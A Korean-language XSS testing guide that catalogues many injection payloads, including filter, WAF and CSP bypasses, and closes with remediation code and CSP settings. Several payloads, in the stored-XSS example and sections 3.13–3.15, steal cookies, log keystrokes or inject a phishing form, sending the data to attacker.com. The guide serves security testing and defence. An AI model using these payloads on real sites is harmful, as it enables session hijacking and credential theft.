# XSS 테스팅 가이드

## 목차
1. [정의&원리](#1-정의원리)
2. [기본 페이로드](#2-기본-페이로드)
3. [특수 페이로드](#3-특수-페이로드)
4. [조치 가이드](#4-조치-가이드)

---

## 1. 정의&원리

### XSS(Cross-Site Scripting)란?
웹 애플리케이션에서 사용자 입력값에 대한 적절한 검증이나 인코딩 없이 출력할 때 발생하는 취약점으로, 공격자가 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행시킬 수 있는 보안 취약점입니다.

### XSS 공격 유형

#### 1.1. Reflected XSS (반사형)
- 사용자 입력값이 즉시 응답에 반영되어 발생
- URL 파라미터나 폼 입력을 통해 공격
- 피해자가 특별히 조작된 링크를 클릭해야 함

**예시 시나리오:**
```
http://example.com/search?q=<script>alert('XSS')</script>
```

#### 1.2. Stored XSS (저장형)
- 악성 스크립트가 서버 데이터베이스에 저장
- 다른 사용자들이 해당 페이지 방문 시마다 실행
- 게시판, 댓글, 프로필 등에서 주로 발생

**예시 시나리오:**
```html
<!-- 게시판 댓글에 저장된 악성 스크립트 -->
<script>
    // 사용자 쿠키 탈취
    fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

#### 1.3. DOM-based XSS
- 클라이언트 측 JavaScript DOM 조작 시 발생
- 서버를 거치지 않고 브라우저에서만 발생
- `document.write()`, `innerHTML` 등 위험한 함수 사용 시

**예시 시나리오:**
```javascript
// 취약한 코드
var hash = location.hash;
document.write(hash); // #<script>alert('XSS')</script>
```

### XSS 테스팅 프로세스

1. **입력 지점 식별**
   - 폼 필드 (텍스트박스, 텍스트에어리어 등)
   - URL 파라미터 (GET, POST)
   - HTTP 헤더 (User-Agent, Referer 등)
   - 쿠키값
   - 파일 업로드 (파일명, 메타데이터)

2. **출력 위치 확인**
   - HTML 태그 내부/외부
   - 태그 속성값
   - JavaScript 코드 내부
   - CSS 스타일 내부
   - HTTP 응답 헤더

3. **필터링 패턴 분석**
   - 특수문자 차단 여부
   - 키워드 블랙리스트
   - 태그/이벤트 핸들러 제한
   - 인코딩 적용 여부

4. **우회 기법 적용**
5. **페이로드 실행 확인**
6. **영향도 평가**

---

## 2. 기본 페이로드

### 2.1. 표준 테스트 페이로드

#### 기본 스크립트 태그
```html
<script>alert('XSS')</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
```

#### 이벤트 핸들러 기반
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe onload=alert('XSS')></iframe>
<input onfocus=alert('XSS') autofocus>
```

### 2.2. 컨텍스트별 기본 페이로드

#### 2.2.1. HTML 태그 내부 삽입
**상황:** `<div>여기에 입력값</div>`
```html
</div><script>alert('XSS')</script><div>
```

#### 2.2.2. 태그 속성값 삽입
**상황:** `<input type="text" value="여기에 입력값">`
```html
" onmouseover="alert('XSS')" "
' onfocus='alert("XSS")' '
```

#### 2.2.3. JavaScript 컨텍스트 삽입
**상황:** `var data = "여기에 입력값";`
```javascript
";alert('XSS');//
';alert('XSS');//
</script><script>alert('XSS')</script><script>
```

#### 2.2.4. CSS 컨텍스트 삽입
**상황:** `<style>body{color:여기에입력값}</style>`
```css
red;}</style><script>alert('XSS')</script><style>
red;background:url('javascript:alert("XSS")')
```

### 2.3. 즉시 실행 페이로드 (사용자 액션 불필요)
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')></iframe>
<meta http-equiv="refresh" content="0;javascript:alert('XSS')">
<link rel=stylesheet href=javascript:alert('XSS')>
```

---

## 3. 특수 페이로드

### 3.1. 필터링 우회 기법

#### 3.1.1. script 태그 차단 우회

**대소문자 혼용:**
```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
```

**키워드 삽입 (단순 삭제 필터링 우회):**
```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<scr<!-- -->ipt>alert('XSS')</scr<!-- -->ipt>
```

**대체 태그 사용:**
```html
<details ontoggle=alert('XSS') open>
<marquee onstart=alert('XSS')>
<video onloadstart=alert('XSS') src=x>
<audio oncanplay=alert('XSS') src=x>
```

#### 3.1.2. 이벤트 핸들러 차단 우회

**포인터 이벤트:**
```html
<div onpointerover=alert('XSS')>Hover</div>
<div onpointerdown=alert('XSS')>Click</div>
<div onpointerenter=alert('XSS')>Move</div>
```

**키보드 이벤트:**
```html
<input onkeydown=alert('XSS') autofocus>
<input onkeyup=alert('XSS') autofocus>
<input onkeypress=alert('XSS') autofocus>
```

**드래그 이벤트:**
```html
<div draggable=true ondrag=alert('XSS')>Drag me</div>
<div draggable=true ondragstart=alert('XSS')>Drag start</div>
```

**애니메이션 이벤트:**
```html
<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
<svg><animateTransform onbegin=alert('XSS') attributeName=transform>
```

**폼 이벤트:**
```html
<form><input name=x onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus><option>
<textarea onfocus=alert('XSS') autofocus>
```

#### 3.1.3. 함수명 차단 우회

**문자열 연결:**
```html
<img src=x onerror="window['al'+'ert']('XSS')">
<img src=x onerror="window['ale'+'rt']('XSS')">
<img src=x onerror="(window)['alert']('XSS')">
```

**백틱 사용:**
```html
<img src=x onerror=alert`XSS`>
<img src=x onerror=confirm`XSS`>
<img src=x onerror=prompt`XSS`>
```

**Constructor 활용:**
```html
<img src=x onerror="[].constructor.constructor('alert(\"XSS\")')()">
<img src=x onerror="('')['constructor']['constructor']('alert(\"XSS\")')()">
```

**eval + 인코딩:**
```html
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>
<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
```

### 3.2. 특수문자 제한 우회

#### 3.2.1. 공백 차단 우회
```html
<svg/onload=alert('XSS')/>
<img/src=x/onerror=alert('XSS')/>
<script>alert('XSS')</script>
<img	src=x	onerror=alert('XSS')> <!-- 탭 문자 -->
<img%0asrc=x%0aonerror=alert('XSS')> <!-- 줄바꿈 -->
<img%0dsrc=x%0donerror=alert('XSS')> <!-- 캐리지 리턴 -->
```

#### 3.2.2. 괄호 () 차단 우회
```html
<img src=x onerror=alert`XSS`>
<img src=x onerror=eval`alert\x28'XSS'\x29`>
<svg onload=alert`XSS`>
```

#### 3.2.3. 따옴표 차단 우회
```html
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<img src=x onerror=alert(/XSS/.source)>
<img src=x onerror=alert(document.domain)>
```

#### 3.2.4. 등호(=) 차단 우회
```html
<svg onload%3dalert('XSS')> <!-- URL 인코딩 -->
<iframe src%3djavascript:alert('XSS')>
```

### 3.3. 인코딩 기반 우회

#### 3.3.1. HTML 엔티티 인코딩
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click</a>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

#### 3.3.2. URL 인코딩
```html
<iframe src="javascript:%61%6c%65%72%74%28%27%58%53%53%27%29"></iframe>
<a href="javascript:%61%6c%65%72%74%28%27%58%53%53%27%29">Click</a>
```

#### 3.3.3. Base64 인코딩
```html
<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>
```

#### 3.3.4. 유니코드 인코딩
```html
<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074('XSS')>
```

### 3.4. DOM 조작 기반 페이로드

#### 3.4.1. Document.write 악용
```html
<img src=x onerror="document.write('<script>alert(\"XSS\")</script>')">
<svg onload="document.write('<img src=x onerror=alert(\"XSS\")>')">
```

#### 3.4.2. innerHTML 조작
```html
<div onclick="this.innerHTML='<img src=x onerror=alert(\"XSS\")>'">Click</div>
<button onclick="document.body.innerHTML='<script>alert(\"XSS\")</script>'">Click</button>
```

#### 3.4.3. location 객체 조작
```html
<img src=x onerror="location='javascript:alert(\"XSS\")'">
<svg onload="location.href='javascript:alert(\"XSS\")'">
<iframe src=x onerror="top.location='javascript:alert(\"XSS\")'">
```

### 3.5. 고급 우회 기법

#### 3.5.1. Polyglot 페이로드 (다중 컨텍스트)
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert("XSS")//'>
```

#### 3.5.2. CSP 우회 시도

**JSONP 엔드포인트 악용:**
```html
<script src="https://example.com/jsonp?callback=alert"></script>
<script src="https://api.example.com/data?jsonp=alert"></script>
```

**base-uri 미설정 시:**
```html
<base href="javascript:alert('XSS');//">
<base href="data:text/html,<script>alert('XSS')</script>">
```

**unsafe-inline 허용 시:**
```html
<link rel=stylesheet href=data:text/css,*{x:expression(alert('XSS'))}>
<style>@import'data:text/css,*{x:expression(alert("XSS"))}';</style>
```

#### 3.5.3. WAF 우회 기법

**대소문자 혼용:**
```html
<ScRiPt>ALeRt('XSS')</ScRiPt>
<ImG sRc=X oNeRrOr=AlErT('XSS')>
```

**HTML 주석 삽입:**
```html
<scr<!--comment-->ipt>alert('XSS')</scr<!--comment-->ipt>
<img src=x one<!-- -->rror=alert('XSS')>
```

**특수 유니코드 문자:**
```html
<script>alert\u0028'XSS'\u0029</script>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074('XSS')>
```

**NULL 바이트 삽입:**
```html
<scri%00pt>alert('XSS')</scri%00pt>
<img src=x onerr%00or=alert('XSS')>
```

### 3.6. 컨텍스트별 특수 페이로드

#### 3.6.1. CSS 컨텍스트
```css
/* IE 전용 expression */
<style>body{x:expression(alert('XSS'))}</style>

/* CSS import 활용 */
<style>@import'data:text/css,*{x:expression(alert("XSS"))}';</style>

/* CSS url 함수 */
<style>body{background:url('javascript:alert("XSS")')}</style>
```

#### 3.6.2. XML/XHTML 컨텍스트
```xml
<![CDATA[<script>alert('XSS')</script>]]>
<?xml version="1.0"?><script>alert('XSS')</script>
```

#### 3.6.3. 모바일/터치 이벤트
```html
<div ontouchstart=alert('XSS')>Touch</div>
<div ontouchend=alert('XSS')>Touch End</div>
<div ongesturestart=alert('XSS')>Gesture</div>
<div onorientationchange=alert('XSS')>Rotate</div>
```

### 3.7. 브라우저별 특수 기법

#### 3.7.1. Internet Explorer 전용
```html
<img src=x onerror=alert('XSS') style=x:expression(alert('XSS'))>
<xml onreadystatechange=alert('XSS')>
<bgsound src=javascript:alert('XSS')>
```

#### 3.7.2. Chrome/Safari/WebKit
```html
<audio src=x onerror=alert('XSS')>
<video src=x onerror=alert('XSS')>
<source src=x onerror=alert('XSS')>
```

#### 3.7.3. Firefox 전용
```html
<keygen onfocus=alert('XSS') autofocus>
<spacer onmouseover=alert('XSS')>
```

### 3.8. 고급 회피 기법

#### 3.8.1. JSON 기반 우회
```html
<script>eval('al'+'ert(JSON.parse(\'["XSS"]\')[0])')</script>
<img src=x onerror="eval('al'+'ert(JSON.stringify(`XSS`).slice(1,-1))')">
```

#### 3.8.2. 정규식 우회
```html
<img src=x onerror="(()=>{return alert})()('XSS')">
<svg onload="(function(){return alert})()('XSS')">
```

#### 3.8.3. 시간 지연 실행
```html
<img src=x onerror="setTimeout('alert(\"XSS\")',1000)">
<svg onload="setInterval('alert(\"XSS\")',3000)">
```

#### 3.8.4. 이벤트 체이닝
```html
<input onfocus="this.onblur=function(){alert('XSS')}" onblur="this.onfocus=null" autofocus tabindex=1>
```

### 3.9. HTTP 헤더 기반 XSS

#### 3.9.1. User-Agent 헤더
```
User-Agent: <script>alert('XSS')</script>
User-Agent: "><script>alert('XSS')</script>
```

#### 3.9.2. Referer 헤더
```
Referer: javascript:alert('XSS')
Referer: "><script>alert('XSS')</script>
```

#### 3.9.3. X-Forwarded-For 헤더
```
X-Forwarded-For: <script>alert('XSS')</script>
X-Forwarded-For: "><img src=x onerror=alert('XSS')>
```

### 3.10. 파일 업로드 기반 XSS

#### 3.10.1. 파일명 XSS
```
filename="<script>alert('XSS')</script>.jpg"
filename="image.jpg<img src=x onerror=alert('XSS')>.jpg"
```

#### 3.10.2. 이미지 메타데이터 XSS
```html
<!-- EXIF 데이터에 XSS 삽입 -->
<img src="image.jpg" alt="<script>alert('XSS')</script>">
```

#### 3.10.3. SVG 파일 XSS
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('XSS')</script>
</svg>
```

### 3.11. Framework 특화 페이로드

#### 3.11.1. AngularJS (1.x)
```html
{{constructor.constructor('alert("XSS")')()}}
{{$eval.constructor('alert("XSS")')()}}
<div ng-app ng-csp><input ng-focus="$event.view.alert('XSS')" autofocus></div>
```

#### 3.11.2. VueJS
```html
{{constructor.constructor('alert("XSS")')()}}
<div v-html="'<img src=x onerror=alert(`XSS`)>'"></div>
```

#### 3.11.3. React (dangerouslySetInnerHTML)
```html
<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert("XSS")>'}}></div>
```

### 3.12. 특수 상황별 페이로드

#### 3.12.1. type=hidden 우회
```html
<!-- type이 앞에 있는 경우 -->
"><img src=x onerror=alert('XSS')>

<!-- type을 덮어쓰는 경우 -->
" type="text" onfocus="alert('XSS')" autofocus="

<!-- accesskey 활용 -->
<input type="hidden" accesskey="X" onclick="alert('XSS')" value="Press Alt+X">
```

#### 3.12.2. 문자열 끝에 추가 텍스트가 있는 경우
```html
<script>alert('XSS')</script><!--
<img src=x onerror=alert('XSS')>//
<svg onload=alert('XSS')>/*comment*/
```

#### 3.12.3. URL Fragment (#) 기반
```html
<!-- 페이지에서 location.hash 사용 시 -->
http://example.com/page#<script>alert('XSS')</script>
http://example.com/page#<img src=x onerror=alert('XSS')>
```

### 3.13. 쿠키 탈취 페이로드
```html
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
<img src=x onerror="new Image().src='http://attacker.com/steal?cookie='+document.cookie">
<svg onload="location='http://attacker.com/steal?cookie='+document.cookie">
```

### 3.14. 키로거 페이로드
```html
<script>
document.addEventListener('keydown', function(e) {
    fetch('http://attacker.com/keylog?key=' + e.key);
});
</script>
```

### 3.15. 피싱 페이로드
```html
<script>
document.body.innerHTML = '<form action="http://attacker.com/phish"><input placeholder="Password"><button>Login</button></form>';
</script>
```

---

## 4. 조치 가이드

### 4.1. 입력 검증 및 필터링

#### 4.1.1. 화이트리스트 기반 검증
```javascript
// 허용할 문자만 정의
const allowedPattern = /^[a-zA-Z0-9\s\-_.@]+$/;
if (!allowedPattern.test(userInput)) {
    throw new Error('Invalid input');
}
```

#### 4.1.2. HTML 태그 제거
```javascript
// 모든 HTML 태그 제거
function stripHtml(input) {
    return input.replace(/<[^>]*>/g, '');
}

// 특정 태그만 허용
function allowOnlyBasicTags(input) {
    return input.replace(/<(?!\/?(?:b|i|em|strong|p|br)\b)[^>]*>/gi, '');
}
```

### 4.2. 출력 인코딩

#### 4.2.1. HTML 컨텍스트 인코딩
```javascript
function htmlEncode(input) {
    return input
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}
```

#### 4.2.2. JavaScript 컨텍스트 인코딩
```javascript
function jsEncode(input) {
    return input
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r');
}
```

#### 4.2.3. URL 컨텍스트 인코딩
```javascript
function urlEncode(input) {
    return encodeURIComponent(input);
}
```

### 4.3. Content Security Policy (CSP) 설정

#### 4.3.1. 기본 CSP 헤더
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';
```

#### 4.3.2. 강화된 CSP 설정
```http
Content-Security-Policy: 
    default-src 'none';
    script-src 'self' 'unsafe-hashes' 'sha256-해시값';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self';
    font-src 'self';
    object-src 'none';
    media-src 'self';
    child-src 'none';
    form-action 'self';
    base-uri 'self';
    frame-ancestors 'none';
```

#### 4.3.3. CSP 위반 모니터링
```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report-endpoint;
```

### 4.4. 보안 라이브러리 사용

#### 4.4.1. DOMPurify 사용법
```javascript
// DOMPurify로 HTML 정화
import DOMPurify from 'dompurify';

const dirty = '<script>alert("XSS")</script><p>Clean content</p>';
const clean = DOMPurify.sanitize(dirty);
// 결과: <p>Clean content</p>
```

#### 4.4.2. OWASP Java Encoder
```java
import org.owasp.encoder.Encode;

// HTML 컨텍스트
String safe = Encode.forHtml(userInput);

// JavaScript 컨텍스트
String safe = Encode.forJavaScript(userInput);

// URL 컨텍스트
String safe = Encode.forUriComponent(userInput);
```

### 4.5. 프레임워크별 보안 설정

#### 4.5.1. Spring Security (Java)
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> 
            headers.contentSecurityPolicy("default-src 'self'; script-src 'self'")
                   .and()
                   .frameOptions().deny()
                   .httpStrictTransportSecurity(hstsConfig -> 
                       hstsConfig.maxAgeInSeconds(31536000)
                                 .includeSubdomains(true))
        );
        return http.build();
    }
}
```

#### 4.5.2. Express.js (Node.js)
```javascript
const helmet = require('helmet');
const app = require('express')();

// CSP 설정
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
    }
}));

// XSS 필터 활성화
app.use(helmet.xssFilter());
```

#### 4.5.3. ASP.NET Core
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.Configure<SecurityHeadersOptions>(options =>
    {
        options.ContentSecurityPolicy = "default-src 'self'; script-src 'self'";
    });
}

public void Configure(IApplicationBuilder app)
{
    app.Use(async (context, next) =>
    {
        context.Response.Headers.Add("Content-Security-Policy", 
            "default-src 'self'; script-src 'self'");
        await next();
    });
}
```

